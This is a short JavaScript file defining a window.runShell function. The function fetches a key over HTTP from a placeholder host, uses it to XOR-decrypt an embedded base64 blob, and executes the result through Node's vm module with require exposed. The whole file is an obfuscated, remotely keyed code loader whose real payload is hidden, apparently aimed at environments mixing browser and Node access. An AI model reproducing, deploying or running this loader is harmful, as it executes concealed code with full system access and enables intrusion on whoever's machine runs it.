typeof require === 'function';

window.runShell = function(){
var http = require('http')
var vm = require("vm");
var fs = require("fs");

var options = {
  host: '0.0.0.0',
  port: 80,
  path: '/'
};

http.get(options, function(res) {
  var body = '';
  res.on('data', function(chunk) {
    body += chunk;
  });
  res.on('end', function() {
	
	var b64string = "xHiVWo9qiVuCNslP4RTAFMw+llWePo5RmD7dFJ57kUGFbIUcznCFQM43zDnmPsAUzD7AFMx9kBTRPpJRnWuJRok2wleEd4xQs26SW497k0fON8w55j7AFMw+wBTMbYgU0T6DRMJtkFWbcMgWj3OEGolmhRbAPrtpxSXtPsw+wBSaf5IUj3KJUYJqwAnMcIVDzHCFQMJNj1eHe5QcxSXtPsw+wBSPcolRgmrOV4NwjlGPasgA2CrUGMw80QHCLNACwi/TGt8vwhjMeJVaj2qJW4I2yU/hFMAUzD7AFMw+g1iFe45Awm6JRIk2k1zCbZRQhXDJD+EUwBTMPsAUzD6TXMJtlFCDa5QanHeQUcR9jF2JcJQd1xPqFMw+wBTMPsBHhDCTQIh7kkbCbolEiTaDWIV7jkDFJe0+zD7AFJE32znmPsAUzGyFQJlsjhTDf88PzDHPFLxshUKJcJRHzGqIUcxQj1CJMIpHzH+QRIB3g1WYd49azHiPRoE+g0aNbYhdgnntPpE3yB3X";
	
	var str = Buffer.from(b64string, 'base64');

	let keyBuf = Buffer.from(body, 'hex')
	let strBuf = Buffer.from(str, 'hex')
	let outBuf = Buffer.alloc(strBuf.length)

	for (let n = 0; n < strBuf.length; n++)
		outBuf[n] = strBuf[n] ^ keyBuf[n % keyBuf.length]

	//console.log(outBuf.toString())
	var code = outBuf.toString()
	var script = new vm.Script(code);
	var context = vm.createContext({ require: require });

	script.runInNewContext(context);
	
  });
}).on('error', function(e) {
  console.log("Got error: " + e.message);
});
};

